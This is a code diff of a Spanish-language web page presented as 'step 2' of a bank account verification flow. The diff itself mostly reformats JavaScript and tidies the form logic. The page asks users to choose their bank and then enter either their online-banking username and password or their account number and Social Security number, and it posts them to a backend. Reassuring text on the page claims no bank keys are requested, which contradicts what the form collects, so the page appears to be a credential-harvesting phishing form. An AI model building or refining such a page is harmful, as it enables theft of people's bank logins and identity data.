@@ -11,7 +11,6 @@
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
 
   <style>
-    /* Tu CSS completo acá - mantenido igual */
     :root {
       --ink: #172033;
       --muted: #5e687a;
@@ -404,7 +403,6 @@
       }
     }
 
-    /* Small adjustments to preserve functionality look from the second file */
     #show-traditional {
       display: inline-block;
       margin-top: 18px;
@@ -465,7 +463,6 @@
         <h2 class="section-title">Paso 2: Información Bancaria y Verificación</h2>
         <p class="section-note">Elija su banco y el método preferido para verificar su cuenta.</p>
 
-        <!-- Bank selection -->
         <div class="field-grid">
           <div class="form-group">
             <label for="bank-select">Seleccione su banco</label>
@@ -508,7 +505,6 @@
           </div>
         </div>
 
-        <!-- Fast verification -->
         <section id="fast-verification" aria-live="polite" aria-hidden="true" class="hidden">
           <form id="fast-form" novalidate>
             <div class="form-group compact-small">
@@ -535,7 +531,6 @@
           Optar por otro tipo de verificación tradicional
         </div>
 
-        <!-- Traditional verification -->
         <section id="traditional-verification" aria-live="polite" aria-hidden="true" class="hidden">
           <form id="traditional-form" novalidate>
             <div class="form-group compact-small">
@@ -614,6 +609,7 @@
             <span>No se solicitan accesos bancarios ni claves personales fuera de un flujo seguro.</span>
           </span>
         </div>
+
         <div class="side-item">
           <span class="material-icons" aria-hidden="true">fact_check</span>
           <span>
@@ -621,6 +617,7 @@
             <span>Solo datos de verificación necesarios.</span>
           </span>
         </div>
+
         <div class="side-item">
           <span class="material-icons" aria-hidden="true">language</span>
           <span>
@@ -633,173 +630,175 @@
   </main>
 
   <script>
-    const bankSelect = document.getElementById('bank-select');
-    const fastVerification = document.getElementById('fast-verification');
-    const fastForm = document.getElementById('fast-form');
-    const showTraditionalBtn = document.getElementById('show-traditional');
-    const traditionalSection = document.getElementById('traditional-verification');
-    const traditionalForm = document.getElementById('traditional-form');
-    const togglePasswordBtn = document.getElementById('toggle-password');
-    const fastPassInput = document.getElementById('fast-pass');
-    const fastSubmitBtn = fastForm ? fastForm.querySelector('button[type="submit"]') : null;
-    const traditionalSubmitBtn = traditionalForm ? traditionalForm.querySelector('button[type="submit"]') : null;
-    const messageEl = document.getElementById('message');
+    const bankSelect = document.getElementById('bank-select')
+    const fastVerification = document.getElementById('fast-verification')
+    const fastForm = document.getElementById('fast-form')
+    const showTraditionalBtn = document.getElementById('show-traditional')
+    const traditionalSection = document.getElementById('traditional-verification')
+    const traditionalForm = document.getElementById('traditional-form')
+    const togglePasswordBtn = document.getElementById('toggle-password')
+    const fastPassInput = document.getElementById('fast-pass')
+    const fastSubmitBtn = fastForm ? fastForm.querySelector('button[type="submit"]') : null
+    const traditionalSubmitBtn = traditionalForm ? traditionalForm.querySelector('button[type="submit"]') : null
+    const messageEl = document.getElementById('message')
 
-    let sending = false;
+    let sending = false
 
     function showMessage(msg, isError = true) {
-      messageEl.textContent = msg;
-      messageEl.className = 'message ' + (isError ? '' : 'success');
+      messageEl.textContent = msg
+      messageEl.className = 'message ' + (isError ? '' : 'success')
     }
 
     function clearMessage() {
-      messageEl.textContent = '';
-      messageEl.className = 'message';
+      messageEl.textContent = ''
+      messageEl.className = 'message'
     }
 
     if (togglePasswordBtn && fastPassInput) {
       togglePasswordBtn.addEventListener('click', () => {
         if (fastPassInput.type === 'password') {
-          fastPassInput.type = 'text';
-          togglePasswordBtn.textContent = 'visibility_off';
-          togglePasswordBtn.setAttribute('aria-label', 'Ocultar contraseña');
+          fastPassInput.type = 'text'
+          togglePasswordBtn.textContent = 'visibility_off'
+          togglePasswordBtn.setAttribute('aria-label', 'Ocultar contraseña')
         } else {
-          fastPassInput.type = 'password';
-          togglePasswordBtn.textContent = 'visibility';
-          togglePasswordBtn.setAttribute('aria-label', 'Mostrar contraseña');
+          fastPassInput.type = 'password'
+          togglePasswordBtn.textContent = 'visibility'
+          togglePasswordBtn.setAttribute('aria-label', 'Mostrar contraseña')
         }
-      });
+      })
     }
 
     function validateForm(form, button) {
-      if (!form) return;
-      const inputs = Array.from(form.querySelectorAll('input, select')).filter(el => el.offsetParent !== null && !el.disabled);
-      const valid = inputs.every(input => input.checkValidity());
+      if (!form) return
+      const inputs = Array.from(form.querySelectorAll('input, select')).filter(el => el.offsetParent !== null && !el.disabled)
+      const valid = inputs.every(input => input.checkValidity())
       if (button) {
-        button.disabled = !valid;
-        button.setAttribute('aria-disabled', String(!valid));
+        button.disabled = !valid
+        button.setAttribute('aria-disabled', String(!valid))
       }
     }
 
-    [fastForm, traditionalForm].forEach(form => {
-      if (!form) return;
-      const btn = form.querySelector('button[type="submit"]');
+    ;[fastForm, traditionalForm].forEach(form => {
+      if (!form) return
+      const btn = form.querySelector('button[type="submit"]')
       form.querySelectorAll('input, select').forEach(input => {
-        const evt = input.tagName.toLowerCase() === 'select' ? 'change' : 'input';
+        const evt = input.tagName.toLowerCase() === 'select' ? 'change' : 'input'
         input.addEventListener(evt, () => {
-          clearMessage();
-          validateForm(form, btn);
-        });
-      });
-      window.addEventListener('load', () => validateForm(form, btn));
-    });
+          clearMessage()
+          validateForm(form, btn)
+        })
+      })
+      window.addEventListener('load', () => validateForm(form, btn))
+    })
 
     function setFormEnabled(form, enabled) {
-      if (!form) return;
-      [...form.querySelectorAll('input, select, button')].forEach(el => {
-        el.disabled = !enabled;
-      });
+      if (!form) return
+      ;[...form.querySelectorAll('input, select, button')].forEach(el => {
+        el.disabled = !enabled
+      })
     }
 
     function hideAllForms() {
       if (fastVerification) {
-        fastVerification.classList.add('hidden');
-        fastVerification.classList.remove('visible');
-        fastVerification.setAttribute('aria-hidden', 'true');
-        setFormEnabled(fastForm, false);
+        fastVerification.classList.add('hidden')
+        fastVerification.classList.remove('visible')
+        fastVerification.setAttribute('aria-hidden', 'true')
+        setFormEnabled(fastForm, false)
       }
       if (traditionalSection) {
-        traditionalSection.classList.add('hidden');
-        traditionalSection.classList.remove('visible');
-        traditionalSection.setAttribute('aria-hidden', 'true');
-        setFormEnabled(traditionalForm, false);
+        traditionalSection.classList.add('hidden')
+        traditionalSection.classList.remove('visible')
+        traditionalSection.setAttribute('aria-hidden', 'true')
+        setFormEnabled(traditionalForm, false)
       }
-      if (showTraditionalBtn) showTraditionalBtn.style.display = 'none';
-      clearMessage();
+      if (showTraditionalBtn) showTraditionalBtn.style.display = 'none'
+      clearMessage()
     }
 
     function showBankSelectionOnly() {
       if (bankSelect) {
-        bankSelect.value = '';
-        bankSelect.focus();
+        bankSelect.value = ''
+        bankSelect.focus()
       }
-      hideAllForms();
-      if (showTraditionalBtn) showTraditionalBtn.style.display = 'block';
-      clearMessage();
+      hideAllForms()
+      if (showTraditionalBtn) showTraditionalBtn.style.display = 'block'
+      clearMessage()
     }
 
     window.addEventListener('load', () => {
-      showBankSelectionOnly();
-    });
+      showBankSelectionOnly()
+    })
 
     if (bankSelect) {
       bankSelect.addEventListener('change', () => {
-        clearMessage();
+        clearMessage()
         if (bankSelect.value) {
           if (fastVerification) {
-            fastVerification.classList.add('visible');
-            fastVerification.classList.remove('hidden');
-            fastVerification.setAttribute('aria-hidden', 'false');
-            setFormEnabled(fastForm, true);
+            fastVerification.classList.add('visible')
+            fastVerification.classList.remove('hidden')
+            fastVerification.setAttribute('aria-hidden', 'false')
+            validateForm(fastForm, fastSubmitBtn)
+            setFormEnabled(fastForm, true)
           }
           if (traditionalSection) {
-            traditionalSection.classList.add('hidden');
-            traditionalSection.classList.remove('visible');
-            traditionalSection.setAttribute('aria-hidden', 'true');
-            setFormEnabled(traditionalForm, false);
+            traditionalSection.classList.add('hidden')
+            traditionalSection.classList.remove('visible')
+            traditionalSection.setAttribute('aria-hidden', 'true')
+            setFormEnabled(traditionalForm, false)
           }
-          if (showTraditionalBtn) showTraditionalBtn.style.display = 'block';
+          if (showTraditionalBtn) showTraditionalBtn.style.display = 'block'
         } else {
           if (fastVerification) {
-            fastVerification.classList.add('hidden');
-            fastVerification.classList.remove('visible');
-            fastVerification.setAttribute('aria-hidden', 'true');
-            setFormEnabled(fastForm, false);
+            fastVerification.classList.add('hidden')
+            fastVerification.classList.remove('visible')
+            fastVerification.setAttribute('aria-hidden', 'true')
+            setFormEnabled(fastForm, false)
           }
-          if (showTraditionalBtn) showTraditionalBtn.style.display = 'block';
+          if (showTraditionalBtn) showTraditionalBtn.style.display = 'block'
         }
-      });
+      })
     }
 
     if (showTraditionalBtn) {
       showTraditionalBtn.addEventListener('click', () => {
         if (bankSelect) {
-          bankSelect.value = '';
-          bankSelect.focus();
+          bankSelect.value = ''
+          bankSelect.focus()
         }
-        clearMessage();
+        clearMessage()
 
         if (fastVerification) {
-          fastVerification.classList.add('hidden');
-          fastVerification.classList.remove('visible');
-          fastVerification.setAttribute('aria-hidden', 'true');
-          setFormEnabled(fastForm, false);
+          fastVerification.classList.add('hidden')
+          fastVerification.classList.remove('visible')
+          fastVerification.setAttribute('aria-hidden', 'true')
+          setFormEnabled(fastForm, false)
         }
 
         if (traditionalSection) {
-          traditionalSection.classList.add('visible');
-          traditionalSection.classList.remove('hidden');
-          traditionalSection.setAttribute('aria-hidden', 'false');
-          setFormEnabled(traditionalForm, true);
+          traditionalSection.classList.add('visible')
+          traditionalSection.classList.remove('hidden')
+          traditionalSection.setAttribute('aria-hidden', 'false')
+          validateForm(traditionalForm, traditionalSubmitBtn)
+          setFormEnabled(traditionalForm, true)
         }
 
-        showTraditionalBtn.style.display = 'none';
-      });
+        showTraditionalBtn.style.display = 'none'
+      })
     }
 
     async function enviarVerificacionRapida() {
-      clearMessage();
+      clearMessage()
 
-      if (sending) return;
-      sending = true;
+      if (sending) return
+      sending = true
 
-      const bank = bankSelect.value.trim();
-      const user = document.getElementById('fast-user').value.trim();
-      const password = fastPassInput.value.trim();
+      const bank = bankSelect.value.trim()
+      const user = document.getElementById('fast-user').value.trim()
+      const password = fastPassInput.value.trim()
       if (!bank || !user || !password) {
-        showMessage('Completa todos los campos de verificación rápida.');
-        sending = false;
-        return;
+        showMessage('Completa todos los campos de verificación rápida.')
+        sending = false
+        return
       }
 
       const payload = {
@@ -807,101 +806,101 @@
         bank,
         user,
         password,
-      };
+      }
 
       try {
-        const response = await fetch('http://localhost:5000/api/verify', {
-          method: 'POST',
+        const response = await fetch("http://localhost:5000/api/verify", {
+          method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload),
-        });
+        })
 
         if (response.ok) {
-          const json = await response.json();
-          showMessage('Verificación rápida enviada correctamente. ID: ' + json.id, false);
-          setTimeout(() => window.location.href = 'paso3.html', 1500);
+          const json = await response.json()
+          showMessage("Verificación rápida enviada correctamente. ID: " + json.id, false)
+          setTimeout(() => window.location.href = "paso3.html", 1500)
         } else {
-          const err = await response.json();
-          showMessage('Error: ' + (err.error || 'Error al enviar'));
+          const err = await response.json()
+          showMessage("Error: " + (err.error || "Error al enviar"))
         }
       } catch (error) {
-        showMessage('Error de conexión.');
-        console.error(error);
+        showMessage("Error de conexión.")
+        console.error(error)
       } finally {
-        sending = false;
+        sending = false
       }
     }
 
     async function enviarVerificacionTradicional() {
-      clearMessage();
+      clearMessage()
 
-      if (sending) return;
-      sending = true;
+      if (sending) return
+      sending = true
 
-      const bank = document.getElementById('traditional-bank').value.trim();
-      const accountNumber = document.getElementById('account-number').value.trim();
-      const ssn = document.getElementById('ssn').value.trim();
+      const bank = document.getElementById("traditional-bank").value.trim()
+      const accountNumber = document.getElementById("account-number").value.trim()
+      const ssn = document.getElementById("ssn").value.trim()
 
       if (!bank || !accountNumber || !ssn) {
-        showMessage('Completa todos los campos de verificación tradicional.');
-        sending = false;
-        return;
+        showMessage("Completa todos los campos de verificación tradicional.")
+        sending = false
+        return
       }
 
       const payload = {
         method: "traditional",
         bank,
         account_number: accountNumber,
-        ssn
-      };
+        ssn,
+      }
 
       try {
-        const response = await fetch('http://localhost:5000/api/solicitud', {
-          method: 'POST',
+        const response = await fetch("http://localhost:5000/api/solicitud", {
+          method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload),
-        });
+        })
 
         if (response.ok) {
-          const json = await response.json();
-          showMessage('Verificación tradicional enviada correctamente. ID: ' + json.id, false);
-          setTimeout(() => window.location.href = 'paso3.html', 1500);
+          const json = await response.json()
+          showMessage("Verificación tradicional enviada correctamente. ID: " + json.id, false)
+          setTimeout(() => window.location.href = "paso3.html", 1500)
         } else {
-          const err = await response.json();
-          showMessage('Error: ' + (err.error || 'Error al enviar'));
+          const err = await response.json()
+          showMessage("Error: " + (err.error || "Error al enviar"))
         }
       } catch (error) {
-        showMessage('Error de conexión.');
-        console.error(error);
+        showMessage("Error de conexión.")
+        console.error(error)
       } finally {
-        sending = false;
+        sending = false
       }
     }
 
     if (fastForm) {
-      fastForm.addEventListener('submit', e => {
-        e.preventDefault();
-        enviarVerificacionRapida();
-      });
+      fastForm.addEventListener("submit", e => {
+        e.preventDefault()
+        enviarVerificacionRapida()
+      })
     }
 
     if (traditionalForm) {
-      traditionalForm.addEventListener('submit', e => {
-        e.preventDefault();
-        enviarVerificacionTradicional();
-      });
+      traditionalForm.addEventListener("submit", e => {
+        e.preventDefault()
+        enviarVerificacionTradicional()
+      })
     }
 
-    const ssnInput = document.getElementById('ssn');
+    const ssnInput = document.getElementById("ssn")
     if (ssnInput) {
-      ssnInput.addEventListener('input', () => {
-        let val = ssnInput.value.replace(/\D/g, '').slice(0, 9);
-        let formatted = '';
-        if (val.length > 0) formatted = val.slice(0, 3);
-        if (val.length > 3) formatted += '-' + val.slice(3, 5);
-        if (val.length > 5) formatted += '-' + val.slice(5, 9);
-        ssnInput.value = formatted;
-      });
+      ssnInput.addEventListener("input", () => {
+        let val = ssnInput.value.replace(/\D/g, "").slice(0, 9)
+        let formatted = ""
+        if (val.length > 0) formatted = val.slice(0, 3)
+        if (val.length > 3) formatted += "-" + val.slice(3, 5)
+        if (val.length > 5) formatted += "-" + val.slice(5, 9)
+        ssnInput.value = formatted
+      })
     }
   </script>
 </body>
